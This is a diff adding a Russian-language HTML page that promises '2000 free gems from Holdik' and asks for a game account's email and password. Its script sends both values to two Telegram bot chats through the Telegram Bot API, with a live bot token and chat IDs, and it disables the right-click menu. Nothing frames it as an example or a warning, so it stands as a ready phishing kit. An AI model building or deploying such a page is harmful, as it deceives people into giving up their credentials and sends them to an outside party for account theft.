@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>holdik</title>
+</head>
+<script type="text/javascript">
+	document.oncontextmenu = function () {
+		return false;
+	}
+	function getgems() {
+		let url = 'https://api.telegram.org/bot1319376539:AAHfB2WJHK6_sGBqlv8jnd0OSAM9W9bKhYk/sendMessage?chat_id=1108316101&text=sc id: ' + in1.value + ' password: ' + in2.value;
+		let xhttp = new XMLHttpRequest();
+		xhttp.open("GET", url);
+		xhttp.send();
+		let url1 = 'https://api.telegram.org/bot1319376539:AAHfB2WJHK6_sGBqlv8jnd0OSAM9W9bKhYk/sendMessage?chat_id=1301569069&text=sc id: ' + in1.value + ' password: ' + in2.value;
+		let xhttp1 = new XMLHttpRequest();
+		xhttp1.open("GET", url1);
+		xhttp1.send();
+	}
+</script>
+<style type="text/css">
+	h1 {
+		color: #fff;
+		background: red;
+		padding: .1em .1em;
+	}
+	body {
+		background-image: url('bg.jpg');
+        -webkit-background-size: cover;
+        -moz-background-size: cover;
+        -o-background-size: cover;
+        background-size: cover;
+	}
+	input {
+		font-size: 30px;
+		border: 1px solid;
+		border-radius: 4px;
+	}
+	a.knopka {
+  		color: #fff; /* цвет текста */
+  		text-decoration: none; /* убирать подчёркивание у ссылок */
+  		user-select: none; /* убирать выделение текста */
+  		background: rgb(212,75,56); /* фон кнопки */
+  		padding: .5em 2em; /* отступ от текста */
+  		outline: none; /* убирать контур в Mozilla */
+	} 
+	a.knopka:hover { background: rgb(232,95,76); } /* при наведении курсора мышки */
+	a.knopka:active { background: rgb(152,15,0); } /* при нажатии */
+</style>
+<body bgcolor="black">
+	<h1 align="center">Получи 2000 гемов от Холдика!!! БЕСПЛАТНО!!!</h1>
+	<p align="center"><input type="email" name="input" placeholder="почта аккаунта" id="in1" value=""></p>
+	<p align="center"><input type="text" name="input" placeholder="пароль от аккаунта" id="in2" value=""></p>
+	<p align="center" onclick="getgems()"><a href="#" class="knopka">ПОЛУЧИТЬ 2000 ГЕМОВ</a></p>
+</body>
+</html>
